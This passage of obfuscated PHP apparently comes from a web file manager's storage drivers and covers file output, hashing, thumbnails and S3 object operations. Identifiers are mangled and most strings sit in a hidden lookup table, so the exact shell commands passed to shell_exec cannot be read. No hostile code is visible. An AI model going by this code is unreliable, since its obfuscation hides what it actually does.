$this->pathThis($İê); } $²û„İ¡ôº®ú = $Š›Ğ†‘œİû[33]; if (strstr($²í‰à”, $Š›Ğ†‘œİû[95])) { $²û„İ¡ôº®ú = substr($²í‰à”, strrpos($²í‰à”, $Š›Ğ†‘œİû[95]) + 1); $²û„İ¡ôº®ú = strtolower($²û„İ¡ôº®ú); } if (strlen($²û„İ¡ôº®ú) > 3 && preg_match($Š›Ğ†‘œİû[96], $²û„İ¡ôº®ú, $ú †ªª³Ä²)) { $²û„İ¡ôº®ú = $Š›Ğ†‘œİû[33]; } return $²û„İ¡ôº®ú; } public function pathThis($ÌâÒÉúªÚ¸Â) { $À =& $_SERVER[ÀÆ]; $ÌâÒÉúªÚ¸Â = str_replace($À[97], $À[8], rtrim($ÌâÒÉúªÚ¸Â, $À[8])); $¨Ê = strrpos($ÌâÒÉúªÚ¸Â, $À[8]); if ($¨Ê === !1) { return $ÌâÒÉúªÚ¸Â; } return substr($ÌâÒÉúªÚ¸Â, $¨Ê + 1); } public function pathFather($şÅú‹¦ÖŠ) { $›‘‰¥£® =& $_SERVER[ÀÆ]; $şÅú‹¦ÖŠ = str_replace($›‘‰¥£®[97], $›‘‰¥£®[8], rtrim($şÅú‹¦ÖŠ, $›‘‰¥£®[8])); $È›¾õ¯ = strrpos($şÅú‹¦ÖŠ, $›‘‰¥£®[8]); if ($È›¾õ¯ === !1) { return $›‘‰¥£®[33]; } return substr($şÅú‹¦ÖŠ, 0, $È›¾õ¯ + 1); } public function hashSimple($Íàéêì™ù¶) { $¡¬¯ =& $_SERVER[ÀÆ]; if (!$Íàéêì™ù¶) { return md5($¡¬¯[33]); } $½¾õ¬¶ = $this->size($Íàéêì™ù¶); $Ç¢Ù = 200; $Ò» = 50; if ($½¾õ¬¶ <= $Ç¢Ù * $Ò») { return $this->hashMd5($Íàéêì™ù¶) . $½¾õ¬¶; } $Ë«¾ä = intval($½¾õ¬¶ / $Ò»); $Šãû©Üï™ÕÂü = $¡¬¯[33]; for ($²’¸Ãùé = 0; $²’¸Ãùé < $Ò»; $²’¸Ãùé++) { $Šãû©Üï™ÕÂü .= $this->fileSubstr($Íàéêì™ù¶, $Ë«¾ä * $²’¸Ãùé, $Ç¢Ù); } $Šãû©Üï™ÕÂü .= $this->fileSubstr($Íàéêì™ù¶, $½¾õ¬¶ - $Ç¢Ù, $Ç¢Ù); return md5($Šãû©Üï™ÕÂü) . $½¾õ¬¶; } public static $md5Cache = array(); public function hashMd5($Ò×¡) { if (!$Ò×¡) { return md5($_SERVER[ÀÆ][33]); } $Ò×¡ = $this->iconvSystem($Ò×¡); if (isset(self::$md5Cache[$Ò×¡])) { return self::$md5Cache[$Ò×¡]; } self::$md5Cache[$Ò×¡] = $this->hashMd5Shell($Ò×¡); if (!self::$md5Cache[$Ò×¡]) { self::$md5Cache[$Ò×¡] = @md5_file($Ò×¡); } return self::$md5Cache[$Ò×¡]; } private function hashMd5Shell($¨ØËĞÔœ¹Â …) { $ÀÌüäë =& $_SERVER[ÀÆ]; if (!$¨ØËĞÔœ¹Â …) { return md5($ÀÌüäë[33]); } if (!function_exists($ÀÌüäë[98])) { return !1; } $ù–æ = array($ÀÌüäë[99], $ÀÌüäë[100]); $¥¯ª§¢ñŸùß = Cache::get($ÀÌüäë[101]); if (!$¥¯ª§¢ñŸùß) { $æ„ = BASIC_PATH . $ÀÌüäë[102]; $íõçÜ = md5_file($æ„); $¥¯ª§¢ñŸùß = $ÀÌüäë[103]; foreach ($ù–æ as $ƒ) { $»¾€£ï = shell_exec($ƒ . "\40\x22{$æ„}\42"); if ($»¾€£ï && substr(trim($»¾€£ï), 0, 32) == $íõçÜ) { $¥¯ª§¢ñŸùß = $ƒ; break; } } Cache::set($ÀÌüäë[101], $¥¯ª§¢ñŸùß, 3600); } if ($¥¯ª§¢ñŸùß == $ÀÌüäë[103]) { return !1; } $»¾€£ï = shell_exec($¥¯ª§¢ñŸùß . "\40\x22{$¨ØËĞÔœ¹Â …}\42"); $»¾€£ï = str_replace($ÀÌüäë[104], $ÀÌüäë[33], $»¾€£ï); return substr($»¾€£ï, 0, 32); } public function link($÷µ×ìúéğûå) { return $÷µ×ìúéğûå; } public function fileOut($ì–äÅš²ı, $…“€ú = false, $î§¾Äë = false, $Ù£Éß¾” = '') { $ïëÊÁÈü =& $_SERVER[ÀÆ]; $this->cacheMethod(null, null); if (!$ì–äÅš²ı || !$this->exist($ì–äÅš²ı)) { show_json(LNG($ïëÊÁÈü[105]), !1, $î§¾Äë); } $Àğã = $this->getType() == $ïëÊÁÈü[106]; $’¯ıÒÉ¶Ú¨Á = $GLOBALS[$ïëÊÁÈü[6]][$ïëÊÁÈü[88]][$ïëÊÁÈü[107]][$ïëÊÁÈü[108]]; $ƒ‘¸à…á¡ıÕ = (double) $GLOBALS[$ïëÊÁÈü[6]][$ïëÊÁÈü[88]][$ïëÊÁÈü[107]][$ïëÊÁÈü[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¸ÇÓ = $this->infoFull($ì–äÅš²ı); $€ø©è°Ÿ = $¸ÇÓ[$ïëÊÁÈü[78]]; $ Ïˆ = gmdate($ïëÊÁÈü[110], $¸ÇÓ[$ïëÊÁÈü[84]]); $±‘ = $î§¾Äë ? $î§¾Äë : $this->iconvApp($¸ÇÓ[$ïëÊÁÈü[28]]); $óÓ = 0; $îÔŠ±£À…â = $€ø©è°Ÿ - 1; $Àˆ°‹‡Í÷ = $this->ext($±‘); if (in_array($Àˆ°‹‡Í÷, array($ïëÊÁÈü[111], $ïëÊÁÈü[112], $ïëÊÁÈü[113], $ïëÊÁÈü[114]))) { $Àˆ°‹‡Í÷ = $ïëÊÁÈü[115]; } if (!$Ù£Éß¾”) { $Ù£Éß¾” = md5($ Ïˆ . $this->hashSimple($ì–äÅš²ı)); } $Ù£Éß¾” = $ïëÊÁÈü[116] . $Ù£Éß¾” . $ïëÊÁÈü[116]; $ãÈÙˆ¡‹ŠÊÄ = get_file_mime($Àˆ°‹‡Í÷); if (strstr($ãÈÙˆ¡‹ŠÊÄ, $ïëÊÁÈü[117])) { $ãÈÙˆ¡‹ŠÊÄ = $ãÈÙˆ¡‹ŠÊÄ . $ïëÊÁÈü[118]; } if ($…“€ú === !1 && !mime_support($ãÈÙˆ¡‹ŠÊÄ)) { $…“€ú = !0; $ãÈÙˆ¡‹ŠÊÄ = $ïëÊÁÈü[119]; } header($ïëÊÁÈü[120]); header($ïëÊÁÈü[121] . $ãÈÙˆ¡‹ŠÊÄ); $Ÿã = rawurlencode($±‘); $Ÿã = $ïëÊÁÈü[116] . $Ÿã . $ïëÊÁÈü[122] . $Ÿã; if ($…“€ú) { header($ïëÊÁÈü[123]); header($ïëÊÁÈü[124] . $Ÿã); } else { header($ïëÊÁÈü[125] . $Ÿã); } header($ïëÊÁÈü[126] . gmdate($ïëÊÁÈü[110], time() + 3600 * 24 * 30) . $ïëÊÁÈü[127]); header($ïëÊÁÈü[128]); header($ïëÊÁÈü[129]); header($ïëÊÁÈü[130]); if (isset($_SERVER[$ïëÊÁÈü[131]]) && strtotime($_SERVER[$ïëÊÁÈü[131]]) == $¸ÇÓ[$ïëÊÁÈü[84]]) { header($ïëÊÁÈü[132], !0, 304); die; } if (isset($_SERVER[$ïëÊÁÈü[133]]) && $_SERVER[$ïëÊÁÈü[133]] == $Ù£Éß¾”) { header($ïëÊÁÈü[134] . $Ù£Éß¾”, !0, 304); die; } header($ïëÊÁÈü[134] . $Ù£Éß¾”); header($ïëÊÁÈü[135] . $ Ïˆ . $ïëÊÁÈü[127]); header($ïëÊÁÈü[136] . $±‘); header($ïëÊÁÈü[137]); header($ïëÊÁÈü[138] . $€ø©è°Ÿ); header($ïëÊÁÈü[139]); if (!$…“€ú && $Àˆ°‹‡Í÷ == $ïëÊÁÈü[140]) { if ($€ø©è°Ÿ > 1024 * 1024 * 5) { die; } $­€ïªìË­‹ƒ = $this->getContent($ì–äÅš²ı); $­€ïªìË­‹ƒ = Html::clearSVG($­€ïªìË­‹ƒ); header($ïëÊÁÈü[141] . strlen($­€ïªìË­‹ƒ)); echo $­€ïªìË­‹ƒ; die; } $® = strtolower($_SERVER[$ïëÊÁÈü[142]]); if ($Àğã && $® && $’¯ıÒÉ¶Ú¨Á) { if (strstr($®, $ïëÊÁÈü[143])) { header($ïëÊÁÈü[144] . $ì–äÅš²ı); } else { if (strstr($®, $ïëÊÁÈü[145])) { header($ïëÊÁÈü[146] . $ì–äÅš²ı); } else { if (strstr($®, $ïëÊÁÈü[147])) { header($ïëÊÁÈü[148] . $ì–äÅš²ı); } } } if ($ƒ‘¸à…á¡ıÕ) { header($ïëÊÁÈü[149] . $ƒ‘¸à…á¡ıÕ); } return; } if (isset($_SERVER[$ïëÊÁÈü[150]])) { if (preg_match($ïëÊÁÈü[151], $_SERVER[$ïëÊÁÈü[150]], $“•ôĞüÆ¹É)) { $óÓ = intval($“•ôĞüÆ¹É[1]); if (!empty($“•ôĞüÆ¹É[2])) { $îÔŠ±£À…â = intval($“•ôĞüÆ¹É[2]); } } header($ïëÊÁÈü[152]); header("\x43\x6f\156\x74\x65\156\164\55\122\141\x6e\147\145\x3a\x20\142\x79\164\145\x73\40{$óÓ}\x2d{$îÔŠ±£À…â}\57" . $€ø©è°Ÿ); } else { header($ïëÊÁÈü[153]); } $Ãü‡öğ™œ§Æ = !0; if ($_SERVER[$ïëÊÁÈü[154]] == $ïëÊÁÈü[155] && $€ø©è°Ÿ > 1204 * 1024 * 1024 * 2) { $Ãü‡öğ™œ§Æ = !1; } if ($Ãü‡öğ™œ§Æ) { header($ïëÊÁÈü[156] . ($îÔŠ±£À…â - $óÓ + 1)); } if ($_SERVER[$ïëÊÁÈü[157]] == $ïëÊÁÈü[158]) { return; } $â×äˆ¥Ÿ•óÄ = 1024 * 100; $ı = 0; if ($ƒ‘¸à…á¡ıÕ) { $ı = intval(1000 * 1000 * ($â×äˆ¥Ÿ•óÄ / $ƒ‘¸à…á¡ıÕ)); } while ($óÓ <= $îÔŠ±£À…â) { $ì€ˆ¨Ÿ¥è¡¹ = timeFloat(); check_abort(); $ÖÃÀ = $îÔŠ±£À…â - $óÓ + 1; if ($ÖÃÀ <= $â×äˆ¥Ÿ•óÄ) { $â×äˆ¥Ÿ•óÄ = $ÖÃÀ; } echo $this->fileSubstr($ì–äÅš²ı, $óÓ, $â×äˆ¥Ÿ•óÄ); $óÓ += $â×äˆ¥Ÿ•óÄ; if ($â×äˆ¥Ÿ•óÄ == $ÖÃÀ) { $óÓ = $îÔŠ±£À…â + 1; } if ($ı) { $Ü = intval(1000 * 1000 * (timeFloat() - $ì€ˆ¨Ÿ¥è¡¹)); $÷Ô‰î = $ı - $Ü; if ($÷Ô‰î > 5) { usleep($÷Ô‰î); } } } } public function fileOutServer($™øÍ¿‡¯“½¸Ô, $Ùº = false, $üí = false, $–øÀİÅëœ­Š = '') { $this->fileOut($™øÍ¿‡¯“½¸Ô, $Ùº, $üí, $–øÀİÅëœ­Š); } public function fileOutLink($ı‰‡º§Ì­—·) { header($_SERVER[ÀÆ][159] . $ı‰‡º§Ì­—·); die; } public function cacheMethod($ÛĞ, $»ƒÒ¢óšºİÄÔ, $‰ = null) { $ŞÄÙÉ–™Ÿ =& $_SERVER[ÀÆ]; static $šòÓŸ‚× = array(); $¸’Ôò = $»ƒÒ¢óšºİÄÔ ? ltrim($this->getPathOuter($»ƒÒ¢óšºİÄÔ), $ŞÄÙÉ–™Ÿ[8]) : $»ƒÒ¢óšºİÄÔ; $Ğ›ÒˆìÏ = $ŞÄÙÉ–™Ÿ[160] . $ÛĞ . $ŞÄÙÉ–™Ÿ[161] . rtrim($¸’Ôò, $ŞÄÙÉ–™Ÿ[8]); if (is_null($ÛĞ)) { $šòÓŸ‚× = array(); return; } if (is_null($»ƒÒ¢óšºİÄÔ)) { unset($šòÓŸ‚×[$Ğ›ÒˆìÏ]); return; } if (!is_null($‰)) { $šòÓŸ‚×[$Ğ›ÒˆìÏ] = $‰; return; } $ÀûÜ‡ = isset($šòÓŸ‚×[$Ğ›ÒˆìÏ]) ? $šòÓŸ‚×[$Ğ›ÒˆìÏ] : null; if (!is_null($ÀûÜ‡)) { return $ÀûÜ‡; } $ÀûÜ‡ = $this->{$ÛĞ}($»ƒÒ¢óšºİÄÔ); $šòÓŸ‚×[$Ğ›ÒˆìÏ] = $ÀûÜ‡; return $ÀûÜ‡; } public function fileOutImage($Ìºƒ¢Ë, $¥Úü = 250) { $ßôèŸÆö =& $_SERVER[ÀÆ]; set_timeout(); if (substr($Ìºƒ¢Ë, 0, 4) == $ßôèŸÆö[147]) { $this->fileOutLink($Ìºƒ¢Ë); } $Ğ½®ú×—ßÀ = $this->info($Ìºƒ¢Ë); $âŞ¢Ïş¶‰ˆ“ = $Ğ½®ú×—ßÀ[$ßôèŸÆö[28]]; $âÒ„ÚÁ¾¾²‰¢ = !1; if (isset($GLOBALS[$ßôèŸÆö[162]]) && $GLOBALS[$ßôèŸÆö[162]][$ßôèŸÆö[76]] == $Ğ½®ú×—ßÀ[$ßôèŸÆö[76]]) { $‹œ¶ = $GLOBALS[$ßôèŸÆö[162]][$ßôèŸÆö[163]]; if (!$Ğ½®ú×—ßÀ[$ßôèŸÆö[164]]) { $Ğ½®ú×—ßÀ[$ßôèŸÆö[164]] = $GLOBALS[$ßôèŸÆö[162]]; } if (isset($‹œ¶[$ßôèŸÆö[165]])) { if ($‹œ¶[$ßôèŸÆö[165]] <= $¥Úü && $‹œ¶[$ßôèŸÆö[166]] <= $¥Úü) { $âÒ„ÚÁ¾¾²‰¢ = !0; } } $âŞ¢Ïş¶‰ˆ“ = $Ğ½®ú×—ßÀ[$ßôèŸÆö[164]][$ßôèŸÆö[28]]; } if ($Ğ½®ú×—ßÀ[$ßôèŸÆö[78]] <= 1024 * 50 || $âÒ„ÚÁ¾¾²‰¢ || !function_exists($ßôèŸÆö[167]) || $Ğ½®ú×—ßÀ[$ßôèŸÆö[168]] == $ßôèŸÆö[169]) { return $this->fileOut($Ìºƒ¢Ë, !1, $âŞ¢Ïş¶‰ˆ“); } if (isset($Ğ½®ú×—ßÀ[$ßôèŸÆö[164]][$ßôèŸÆö[170]])) { $·…åª×Âµí = $Ğ½®ú×—ßÀ[$ßôèŸÆö[164]][$ßôèŸÆö[170]]; } else { if (isset($Ğ½®ú×—ßÀ[$ßôèŸÆö[164]][$ßôèŸÆö[171]])) { $·…åª×Âµí = $Ğ½®ú×—ßÀ[$ßôèŸÆö[164]][$ßôèŸÆö[171]]; } else { $·…åª×Âµí = md5("{$Ğ½®ú×—ßÀ[$ßôèŸÆö[28]]}\x5f{$Ğ½®ú×—ßÀ[$ßôèŸÆö[76]]}\x5f{$Ğ½®ú×—ßÀ[$ßôèŸÆö[78]]}"); } } $°©ıĞ¶¸Õ‘ÎÌ = "{$·…åª×Âµí}\x5f{$¥Úü}\56\x70\x6e\147"; if (!($²½£ó = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $ßôèŸÆö[172]))) { $õ‰ÈŠÆŒ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $ßôèŸÆö[173]); } else { $õ‰ÈŠÆŒ = KodIO::make($²½£ó); } if ($²½£ó = IO::fileNameExist($õ‰ÈŠÆŒ, $°©ıĞ¶¸Õ‘ÎÌ)) { $ƒ² = KodIO::make($²½£ó); return IO::fileOut($ƒ², !1, $âŞ¢Ïş¶‰ˆ“); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ƒ² = DATA_THUMB . $°©ıĞ¶¸Õ‘ÎÌ; del_file($ƒ²); if (!@file_exists($ƒ²)) { $ÌÊ¾ = TEMP_FILES; if (!is_dir($ÌÊ¾)) { mk_dir($ÌÊ¾); } $Û´îÂŒñ³®ü = $ÌÊ¾ . $·…åª×Âµí . $ßôèŸÆö[95] . $Ğ½®ú×—ßÀ[$ßôèŸÆö[168]]; if (!@file_exists($Û´îÂŒñ³®ü)) { $Û´îÂŒñ³®ü = $this->download($Ìºƒ¢Ë, $Û´îÂŒñ³®ü); } ImageThumb::createThumb($Û´îÂŒñ³®ü, $ƒ², $¥Úü, $¥Úü * 10); } if (!file_exists($ƒ²) || filesize($ƒ²) < 100) { return @file_exists($Û´îÂŒñ³®ü) ? IO::fileOut($Û´îÂŒñ³®ü) : $this->fileOut($Ìºƒ¢Ë); } if (!($áöúçü© = IO::move($ƒ², $õ‰ÈŠÆŒ))) { return IO::fileOut($ƒ²); } del_file($ƒ²); IO::fileOut($áöúçü©); } public function fileOutImageServer($Äâû¥Ñ¾¤¯, $Ÿ¼ = 250) { $this->fileOutImage($Äâû¥Ñ¾¤¯, $Ÿ¼); } public function fileNameAuto($¢°¨¿, $¡, $¾ = REPEAT_RENAME, $­ÛÚ = false) { $µ¸şÒäŞØ =& $_SERVER[ÀÆ]; $ÓÃ…ï  = $¢°¨¿ === $µ¸şÒäŞØ[33] ? $¡ : rtrim($¢°¨¿, $µ¸şÒäŞØ[8]) . $µ¸şÒäŞØ[8] . $¡; if ($¾ == REPEAT_REPLACE || !$this->exist($ÓÃ…ï ) || $­ÛÚ && $¾ != REPEAT_RENAME_FOLDER) { return $¡; } if ($¾ == REPEAT_SKIP) { return !1; } $ğŞÒ¼å–ë = $µ¸şÒäŞØ[95] . get_path_ext($¡); $ğŞÒ¼å–ë = $ğŞÒ¼å–ë == $µ¸şÒäŞØ[95] || $­ÛÚ ? $µ¸şÒäŞØ[33] : $ğŞÒ¼å–ë; $¢àŠÄ = 1; $óş‰ = substr($¡, 0, strlen($¡) - strlen($ğŞÒ¼å–ë)); $ë´áİ†ø‡ = $óş‰ . "\x28{$¢àŠÄ}\x29{$ğŞÒ¼å–ë}"; while ($this->exist(rtrim($¢°¨¿, $µ¸şÒäŞØ[8]) . $µ¸şÒäŞØ[8] . $ë´áİ†ø‡)) { $ë´áİ†ø‡ = $óş‰ . "\50{$¢àŠÄ}\51{$ğŞÒ¼å–ë}"; $¢àŠÄ++; } return $ë´áİ†ø‡; } private function fileNameAutoList($İı˜›™, $¸ú‰İ, $ÕÓúúçÂí¸ = false) { $Àñå˜ÁÏ =& $_SERVER[ÀÆ]; $ïŠ§ö = $this->listPath($İı˜›™, !0); $ïŠ§ö = array_merge($ïŠ§ö[$Àñå˜ÁÏ[75]], $ïŠ§ö[$Àñå˜ÁÏ[74]]); $í¨¶éÊê¾ = array_to_keyvalue($ïŠ§ö, $Àñå˜ÁÏ[33], $Àñå˜ÁÏ[28]); $ËÚ = $Àñå˜ÁÏ[95] . get_path_ext($¸ú‰İ); $ËÚ = $ËÚ == $Àñå˜ÁÏ[95] || $ÕÓúúçÂí¸ ? $Àñå˜ÁÏ[33] : $ËÚ; $Üœ = substr($¸ú‰İ, 0, strlen($¸ú‰İ) - strlen($ËÚ)); $Ö‚ŒÁ­ğ€û = $Üœ . "\50\x30\x29{$ËÚ}"; for ($Û…é§• = 1; $Û…é§• <= count($í¨¶éÊê¾) + 1; $Û…é§•++) { $Ö‚ŒÁ­ğ€û = $Üœ . "\x28{$Û…é§•}\x29{$ËÚ}"; if (!in_array_not_case($Ö‚ŒÁ­ğ€û, $í¨¶éÊê¾)) { return $Ö‚ŒÁ­ğ€û; } } return $Ö‚ŒÁ­ğ€û; } public function listAllFiles($“¿“Ê, $‹¤‰ıÃˆĞŞ, $…· ¯”Á = array()) { $•ë¸áãĞ¡‡° =& $_SERVER[ÀÆ]; if (empty($‹¤‰ıÃˆĞŞ)) { return array(); } $‹ = array(); $“¿“Ê = trim($“¿“Ê, $•ë¸áãĞ¡‡°[8]); foreach ($‹¤‰ıÃˆĞŞ as $šŠ›…ñññ) { $¯èÂ†Ñâ²ĞË = ltrim(substr(trim($šŠ›…ñññ, $•ë¸áãĞ¡‡°[8]), strlen($“¿“Ê)), $•ë¸áãĞ¡‡°[8]); $‹ = array_merge($‹, $this->slicePath($¯èÂ†Ñâ²ĞË)); } $¾ñ“©¡ÏâŠ = array(); foreach (array_unique($‹) as $šŠ›…ñññ) { $İé¿ = array($•ë¸áãĞ¡‡°[76] => $this->getPathOuter($•ë¸áãĞ¡‡°[8] . $“¿“Ê . $•ë¸áãĞ¡‡°[8] . $šŠ›…ñññ), $•ë¸áãĞ¡‡°[77] => 1, $•ë¸áãĞ¡‡°[78] => 0); if (substr($šŠ›…ñññ, -1) != $•ë¸áãĞ¡‡°[8]) { $İé¿[$•ë¸áãĞ¡‡°[77]] = 0; $Ÿ¬š—ƒû = $this->getPath($“¿“Ê . $•ë¸áãĞ¡‡°[8] . $šŠ›…ñññ); $İé¿[$•ë¸áãĞ¡‡°[78]] = isset($…· ¯”Á[$Ÿ¬š—ƒû]) ? $…· ¯”Á[$Ÿ¬š—ƒû] : $this->size($Ÿ¬š—ƒû); } $¾ñ“©¡ÏâŠ[] = $İé¿; } return $¾ñ“©¡ÏâŠ; } public function slicePath($§Şù‹´”) { $ˆ =& $_SERVER[ÀÆ]; $¸ = explode($ˆ[8], trim($§Şù‹´”, $ˆ[8])); $ˆë£Ÿ®‡¬Í = 0; do { ++$ˆë£Ÿ®‡¬Í; $†Ä¯îÀ¢¥êŞ[] = implode($ˆ[8], array_slice($¸, 0, $ˆë£Ÿ®‡¬Í)) . $ˆ[8]; } while ($ˆë£Ÿ®‡¬Í < count($¸)); $†Ä¯îÀ¢¥êŞ[count($¸) - 1] = $§Şù‹´”; return $†Ä¯îÀ¢¥êŞ; } public function getHost() { $´õµÙó« =& $_SERVER[ÀÆ]; $Ç±ÚÅ®„ãÍ = parse_url(trim($this->domain, $´õµÙó«[8])); $æë´ì¦ı™ = isset($Ç±ÚÅ®„ãÍ[$´õµÙó«[174]]) ? $Ç±ÚÅ®„ãÍ[$´õµÙó«[174]] : http_type(); $ŠŠç = isset($Ç±ÚÅ®„ãÍ[$´õµÙó«[175]]) ? $Ç±ÚÅ®„ãÍ[$´õµÙó«[175]] : $Ç±ÚÅ®„ãÍ[$´õµÙó«[76]]; if (isset($Ç±ÚÅ®„ãÍ[$´õµÙó«[176]])) { $ŠŠç .= $´õµÙó«[4] . $Ç±ÚÅ®„ãÍ[$´õµÙó«[176]]; } return $æë´ì¦ı™ . $´õµÙó«[177] . $ŠŠç; } public function pathEncode($ì) { $¸ÕÆ¤Úæ =& $_SERVER[ÀÆ]; return str_replace($¸ÕÆ¤Úæ[178], $¸ÕÆ¤Úæ[8], rawurlencode($ì)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($¿) { set_timeout(); require_once SDK_DIR . $_SERVER[ÀÆ][179]; parent::__construct(); $this->_init($¿); } public function _init($ç¿Š) { foreach ($ç¿Š as $ñèõ† öã  => $•) { if (isset($this->{$ñèõ† öã })) { $this->{$ñèõ† öã } = $•; } } $this->endpoint = $ç¿Š[$_SERVER[ÀÆ][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($‰”šï¥‚ = "\x76\64") { $this->signVer = $‰”šï¥‚; $this->client->setSignatureVersion($‰”šï¥‚); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $ÍÆÚ¨÷‚ƒù« =& $_SERVER[ÀÆ]; $¼èÍóÌ«·ã = $this->getBucketCors(); if (!$¼èÍóÌ«·ã || !is_array($¼èÍóÌ«·ã)) { return !1; } if ($¼èÍóÌ«·ã[$ÍÆÚ¨÷‚ƒù«[181]] != $ÍÆÚ¨÷‚ƒù«[182] || $¼èÍóÌ«·ã[$ÍÆÚ¨÷‚ƒù«[183]] != $ÍÆÚ¨÷‚ƒù«[182]) { return !1; } $¤ƒ”—ìóé¦´Õ = array_map($ÍÆÚ¨÷‚ƒù«[184], $¼èÍóÌ«·ã[$ÍÆÚ¨÷‚ƒù«[185]]); if (!is_array($¤ƒ”—ìóé¦´Õ)) { $¤ƒ”—ìóé¦´Õ = array(); } $™›ê = array($ÍÆÚ¨÷‚ƒù«[186], $ÍÆÚ¨÷‚ƒù«[187], $ÍÆÚ¨÷‚ƒù«[188], $ÍÆÚ¨÷‚ƒù«[189], $ÍÆÚ¨÷‚ƒù«[190]); $ÇâÁ÷ = array_diff($™›ê, $¤ƒ”—ìóé¦´Õ); return empty($ÇâÁ÷); } public function mkfile($ä¼, $ÙÛî“‹îªı‰³ = '', $™úı† = REPEAT_RENAME) { $¡ƒî« = $this->setContent($ä¼, $ÙÛî“‹îªı‰³); if ($¡ƒî« !== !1) { return $this->getPathOuter($ä¼); } return !1; } public function mkdir($¾Öü¼, $öàÌ²“ = REPEAT_SKIP) { $Û€şÌµÈ =& $_SERVER[ÀÆ]; if (empty($¾Öü¼) && $¾Öü¼ !== $Û€şÌµÈ[191]) { return !1; } if ($this->_isFolder($¾Öü¼)) { return $this->getPathOuter($¾Öü¼); } $¶É¨º±È = $this->setContent($¾Öü¼, $Û€şÌµÈ[33], !0); if ($¶É¨º±È !== !1) { return $this->getPathOuter($¾Öü¼); } return !1; } public function copyFile($Ş¥—Şè«, $ÌïÉóóÆÍ÷Æ, $Ãúíøİåµ™” = array()) { $•Ñ¡ =& $_SERVER[ÀÆ]; $å“µ–Ùô×Ú“ = $this->objectMeta($Ş¥—Şè«); if (!$å“µ–Ùô×Ú“) { return !1; } if ($å“µ–Ùô×Ú“[$•Ñ¡[78]] <= 1024 * 1024 * 200) { $Í¾À‘×úèÒ±Ï = $this->client->copyObject($this->bucket, $Ş¥—Şè«, $this->bucket, $ÌïÉóóÆÍ÷Æ, $•Ñ¡[192], $Ãúíøİåµ™”); } else { $Í¾À‘×úèÒ±Ï = $this->client->multiCopyObject($this->bucket, $Ş¥—Şè«, $this->bucket, $ÌïÉóóÆÍ÷Æ, $Ãúíøİåµ™”); } $Í¾À‘×úèÒ±Ï = $Í¾À‘×úèÒ±Ï ? $this->getPathOuter($ÌïÉóóÆÍ÷Æ) : !1; return $Í¾À‘×úèÒ±Ï; } public function moveFile($¥Ñƒ©Ê , $­ÏûÓ“­¥) { if ($this->copyFile($¥Ñƒ©Ê , $­ÏûÓ“­¥)) { $this->delFile($¥Ñƒ©Ê ); return $this->getPathOuter($­ÏûÓ“­¥); } return !1; } public function delFile($ ø¥èó) { return $this->client->deleteObject($this->bucket, $ ø¥èó); } public function delFolder($åÄ¡) { $æ©— =& $_SERVER[ÀÆ]; if (!$this->exist($åÄ¡)) { return !0; } $this->listItemCache = !1; $‚ê¤È–…»’½ = $this->fileList($åÄ¡); $this->listItemCache = !0; $åš«Ş = trim($åÄ¡, $æ©—[8]) . $æ©—[8]; if (!empty($åÄ¡) && $åÄ¡ !== $æ©—[191] && !in_array($åš«Ş, $‚ê¤È–…»’½[$æ©—[75]])) { $‚ê¤È–…»’½[$æ©—[75]][] = $åš«Ş; } $ö = $this->delByBatch($‚ê¤È–…»’½[$æ©—[74]]); if (!$ö) { return !1; } $ö = $this->delByBatch($‚ê¤È–…»’½[$æ©—[75]]); if (!$ö) { return !1; } return $this->delFile($åš«Ş); } private function delByBatch($üâÆş±€¢æÀ) { foreach (array_chunk($üâÆş±€¢æÀ, 1000) as $ºœ) { $¿¯¯ô¡‹™£ = $this->client->deleteObjects($this->bucket, $ºœ); if (!$¿¯¯ô¡‹™£) { return !1; } } return !0; } public function rename($±û±, $ùúú£³) { return $this->renameObject($±û±, $ùúú£³); } public function listPath($‚—, $ç˜ = false) { $¯Â =& $_SERVER[ÀÆ]; $‘Å²ìß§Ã = $this->fileList($‚—, $¯Â[8], !0); foreach ($‘Å²ìß§Ã[$¯Â[75]] as $«Ì‹È«Êİ => $ÏçôÇïµ»é­–) { $‘Å²ìß§Ã[$¯Â[75]][$«Ì‹È«Êİ] = $this->folderInfo($ÏçôÇïµ»é­–, $ç˜); } foreach ($‘Å²ìß§Ã[$¯Â[74]] as $«Ì‹È«Êİ => $ÏçôÇïµ»é­–) { $‘Å²ìß§Ã[$¯Â[74]][$«Ì‹È«Êİ] = $this->fileInfo($ÏçôÇïµ»é­–[$¯Â[28]], $ç˜, $ÏçôÇïµ»é­–); } return $‘Å²ìß§Ã; } private function fileInfo($À¹’£÷ø, $ï = false, $°–¢¤¢¥ç’ = array()) { $¼‰¸ =& $_SERVER[ÀÆ]; $Œ¤ = array($¼‰¸[28] => $this->pathThis($À¹’£÷ø), $¼‰¸[76] => $this->getPathOuter($À¹’£÷ø), $¼‰¸[29] => $¼‰¸[193], $¼‰¸[168] => $this->ext($À¹’£÷ø), $¼‰¸[78] => isset($°–¢¤¢¥ç’[$¼‰¸[78]]) ? $°–¢¤¢¥ç’[$¼‰¸[78]] : 0); if ($ï) { return $Œ¤; } $Œ¤[$¼‰¸[194]] = $Œ¤[$¼‰¸[84]] = 0; $Œ¤[$¼‰¸[195]] = $Œ¤[$¼‰¸[196]] = !0; if (empty($°–¢¤¢¥ç’)) { $°–¢¤¢¥ç’ = $this->objectMeta($À¹’£÷ø); if (!$°–¢¤¢¥ç’) { return $Œ¤; } } if (isset($°–¢¤¢¥ç’[$¼‰¸[197]])) { $Œ¤[$¼‰¸[84]] = $°–¢¤¢¥ç’[$¼‰¸[197]]; } if (isset($°–¢¤¢¥ç’[$¼‰¸[78]])) { $Œ¤[$¼‰¸[78]] = $°–¢¤¢¥ç’[$¼‰¸[78]]; } return $Œ¤; } private function folderInfo($Ä·, $ª¢¶Ø›ğõ· = false) { $§éİµ¤±È÷Â =& $_SERVER[ÀÆ]; $³¥îÔ‚å¿ = 